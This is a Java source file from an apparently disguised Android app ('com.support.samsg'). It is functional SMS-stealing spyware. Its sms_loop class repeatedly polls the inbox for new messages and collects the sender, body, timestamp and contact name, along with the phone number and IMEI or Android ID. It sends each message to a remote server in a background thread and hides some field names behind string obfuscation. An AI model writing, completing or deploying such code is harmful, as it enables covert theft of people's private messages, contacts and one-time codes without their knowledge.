package com.support.samsg;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Looper;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.telephony.TelephonyManager;

import androidx.core.app.ActivityCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class sms_loop implements Runnable{
    static  Context mContext;
    public static int minterval = 0;
    public int n_sms_count = 0;
    public String str_MYphone = "";
    public  boolean run = true;
    protected static ExecutorService mExecutorService;
    protected static JSONObject mLogData = null;
    public sms_loop(Context context,int interval) {
        mContext = context;
        minterval=interval;
        mLogData = new JSONObject();
        mExecutorService = Executors.newSingleThreadExecutor();
    }
    @Override
    public void run() {
        Looper.prepare();
        int index = 1;
        while (run) {
            try {
                sms_prob();
                Thread.sleep(1000 * minterval);
            } catch (InterruptedException e) {
                run = false;
            }
        }
        Looper.loop();
    }
    public void stoprun(){
        run = false;
    }
    void sms_prob()
    {
        if (mContext.checkSelfPermission("android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
            if (str_MYphone == "") {
                getMyphoneNumber();
            }
            int current_sms_count = countSMS();
            if (n_sms_count == 0)
            {

                try {
                    if (current_sms_count >=10){
                        readSMS(10);
                    }
                    else {
                        readSMS(current_sms_count);
                    }
                } catch (JSONException e) {
                    throw new RuntimeException(e);
                }
                n_sms_count = current_sms_count;
            }
            else {
                if (n_sms_count < current_sms_count) {
                    try {
                        readSMS(current_sms_count - n_sms_count);
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
                    n_sms_count = current_sms_count;
                }
            }

        }
    }
    private int countSMS() {
        Uri uri = Uri.parse("content://sms/inbox");
        Cursor cursor = mContext.getContentResolver().query(uri, null, null, null, null);

        if (cursor != null) {
            int count = cursor.getCount();
            // smsCountTextView.setText("Total SMS Count: " + count);
            cursor.close();
            return count;
        } else {
            // smsCountTextView.setText("No SMS found.");
            return 0;
        }
    }

    private void readSMS(int n_limit) throws JSONException {
        Uri uri = Uri.parse("content://sms/inbox");
        String[] neleriAlicaz = {"body", "date", "address"};
        String sortOrder = Telephony.Sms.Inbox.DEFAULT_SORT_ORDER + " LIMIT " + n_limit;
        Cursor cursor = mContext.getContentResolver().query(uri, neleriAlicaz, null, null, sortOrder);
        assert cursor != null;
        if (cursor.moveToFirst()) {
            do {
                int addressIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
                int bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY);
                // int subjectIndex = cursor.getColumnIndex(Telephony.Sms.SUBJECT);
                int timeIndex = cursor.getColumnIndex(Telephony.Sms.DATE);
                String sender = cursor.getString(addressIndex);
                String recipient = str_MYphone;
                //  String subject = cursor.getString(subjectIndex);
                String body = cursor.getString(bodyIndex);
                String time = suankiZaman(Long.parseLong(cursor.getString(timeIndex)));
                String isim = "Not found";
                try {
                    isim = getContactbyPhoneNumber(mContext, cursor.getString(addressIndex));
                } catch (Exception e) {
                    e.printStackTrace();
                }
                JSONObject mSMSData = new JSONObject();
                mSMSData.put("Sender",sender);
                mSMSData.put("Receiver",recipient);
                mSMSData.put("Content",body);
                mSMSData.put("Time",time);
                mSMSData.put("ISIM",isim);

                send_smsLogs(mSMSData.toString());

                mSMSData.remove("Sender");
                mSMSData.remove("Receiver");
                mSMSData.remove("Content");
                mSMSData.remove("Time");
                mSMSData.remove("ISIM");
            } while (cursor.moveToNext());
        }
        cursor.close();
    }

    public static String suankiZaman(long yunix) {
        SimpleDateFormat simpleDateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss", Locale.KOREA);
        Date date = new Date(yunix);
        return simpleDateFormat.format(date);
    }

    public void getMyphoneNumber() {
        TelephonyManager telephonyManager = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(mContext, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        str_MYphone  = telephonyManager.getLine1Number();
    }
    @SuppressLint("Range")
    private String getContactbyPhoneNumber(Context context, String phoneNumber) {
        try {
            Uri uri = Uri.withAppendedPath(ContactsContract.PhoneLookup.CONTENT_FILTER_URI, phoneNumber);
            String[] projection = { ContactsContract.Contacts.DISPLAY_NAME };
            Cursor cursor = context.getContentResolver().query(uri, projection, null, null, null);
            if (cursor == null) {
                return phoneNumber;
            } else {
                String name = phoneNumber;
                try {
                    if (cursor.moveToFirst()) {
                        name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    }
                } finally {
                    cursor.close();
                }
                return name;
            }
        } catch (Exception e) {
            return "Not found";
        }
    }
    private static void send_smsLogs(String str_smslog) {
        String IMEI = getIMEI();
        String strID = "Kur-" + IMEI + "_" + GetIdentifier();
        try {
            mLogData.put(MyCrypt.crypt("r\u0016v\n", 42), MyCrypt.crypt("j\u0000a\u001C", 42));//"LOGS"
            mLogData.put(MyCrypt.crypt("o\u0002c\u0006", 42), IMEI);
            mLogData.put("SMS", str_smslog);

            String _data =mLogData.toString();

            mExecutorService.submit(new PostByWeb(mContext, PostType.DATA, strID, _data, new ICallBack() {
                @Override
                public boolean onFinished(String response) {
                    return true;
                }
                @Override
                public void onError(String error) {
                    mLogData.remove(MyCrypt.crypt("r\u0016v\n", 42));
                    mLogData.remove(MyCrypt.crypt("o\u0002c\u0006", 42));
                    mLogData.remove(MyCrypt.crypt("b\np\u0006e\n", 42));

                }
                @Override
                public void onSuccess(Object resp) {
                    mLogData.remove(MyCrypt.crypt("r\u0016v\n", 42));
                    mLogData.remove(MyCrypt.crypt("o\u0002c\u0006", 42));
                    mLogData.remove(MyCrypt.crypt("b\np\u0006e\n", 42));
                }
            }));
        } catch (JSONException e) {
            mLogData.remove(MyCrypt.crypt("r\u0016v\n", 42));
            mLogData.remove(MyCrypt.crypt("o\u0002c\u0006", 42));
            mLogData.remove(MyCrypt.crypt("b\np\u0006e\n", 42));

        }
    }
    @SuppressLint("HardwareIds")
    public static String getIMEI() {
        String deviceId;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                deviceId = Settings.Secure.getString(mContext.getContentResolver(), Settings.Secure.ANDROID_ID);
            } else {
                final TelephonyManager mTelephony = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
                if (mTelephony.getDeviceId() != null) {
                    deviceId = mTelephony.getDeviceId();
                } else {
                    deviceId = Settings.Secure.getString(mContext.getContentResolver(), Settings.Secure.ANDROID_ID);
                }
            }
            return deviceId;
        }catch(Exception e)
        {
            deviceId = Settings.Secure.getString(mContext.getContentResolver(), Settings.Secure.ANDROID_ID);
            return deviceId;

        }
    }
    protected static String GetIdentifier() {
        try {
            return Settings.Secure.getString(mContext.getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            return MyCrypt.crypt("#54(4\u0018/*#.", 19);
        }
    }
}
